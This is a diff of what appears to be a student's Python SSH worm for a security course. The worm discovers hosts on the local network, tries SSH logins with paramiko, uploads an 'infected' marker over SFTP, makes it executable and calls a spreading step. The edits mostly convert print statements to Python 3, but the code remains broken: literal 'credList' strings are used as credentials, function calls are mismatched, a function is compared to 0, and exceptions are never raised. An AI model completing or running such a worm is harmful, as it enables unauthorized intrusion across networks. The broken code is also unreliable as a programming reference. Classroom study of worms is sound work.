@@ -74,7 +74,7 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.	
-	
+	pass
 	
 	
 
@@ -119,11 +119,11 @@ def tryCredentials(host, userName, password, sshClient):
 	
 	try:
 		# connect to the remote system using ssh		
-		for (credList=0; credList<3;credList++)
-			ssh.connect("192.168.1.24" , username="credList", password="credList"
-	except
-		print "something went wrong while trying to establish a connection"
-		paramiko.SSHException exception
+		for credList in range(4):
+			ssh.connect("192.168.1.24" , username="credList", password="credList")
+	except:
+		print ("something went wrong while trying to establish a connection")
+		paramiko.SSHException()
 	
 	# create an instance of the SFTP client used for uploading/dl files and exe. commands
 	sftpClient = ssh.open_sftp()
@@ -132,7 +132,7 @@ def tryCredentials(host, userName, password, sshClient):
 	sftpClient.put("infected.txt", INFECTED_MARKER_FILE)
 	
 	# Make yourself executable on the remote system
-	ssh.exec_command("chmod a+x INFECTED_MARKER_FILE)
+	ssh.exec_command("chmod a+x INFECTED_MARKER_FILE")
 		
 
 	# /tmp/infected.txt - the malicious file
@@ -177,11 +177,11 @@ def attackSystem(host):
 		# instance of the SSH connection
 		# to the remote system. 
 		tryCredentials(getHostsOnTheSameNetwork, username, password)
-		if tryCredentials = 0 
+		if tryCredentials == 0: 
 			print ("we have successfully compromised the victim")
 			
 	# Could not find working credentials
-	paramiko.SSHException exception
+	paramiko.SSHException()
 	
 	print("could not find working credentials")
 	#return None	
@@ -258,7 +258,7 @@ networkHosts = getHostsOnTheSameNetwork()
 # from the list of discovered systems (we
 # do not want to target ourselves!).
 
-print "Found hosts: ", networkHosts
+print ("Found hosts: ", networkHosts)
 
 
 # Go through the network hosts
@@ -267,13 +267,13 @@ for host in networkHosts:
 	# Try to attack this host
 	sshInfo =  attackSystem(host)
 	
-	print sshInfo
+	print (sshInfo)
 	
 	
 	# Did the attack succeed?
 	if sshInfo:
 		
-		print "Trying to spread"
+		print ("Trying to spread")
 		
 		# TODO: Check if the system was	
 		# already infected. This can be
@@ -283,9 +283,9 @@ for host in networkHosts:
 		# when it first infects the system)
 		# This can be done using code similar to
 		# the code below:
-		 try:
+		try:
 			remotepath = '/tmp/infected.txt'
-		    localpath = '/home/cpsc/'
+			localpath = '/home/cpsc/'
 		#	 # Copy the file from the specified
 		#	 # remote path to the specified
 		# 	 # local path. If the file does exist
@@ -294,9 +294,9 @@ for host in networkHosts:
 		# 	 # (that is, we know the system is
 		# 	 # not yet infected).
 		# 
-		        sftp.get(filepath, localpath)
-		 except IOError:
-		       print "This system should be infected"
+			sftp.get(filepath, localpath)
+		except IOError:
+		       print ("This system should be infected")
 		#
 		#
 		# If the system was already infected proceed.
@@ -304,6 +304,6 @@ for host in networkHosts:
 		# Infect that system
 		spreadAndExecute(sshInfo[0])
 		
-		print "Spreading complete"	
+		print ("Spreading complete")
 	
 
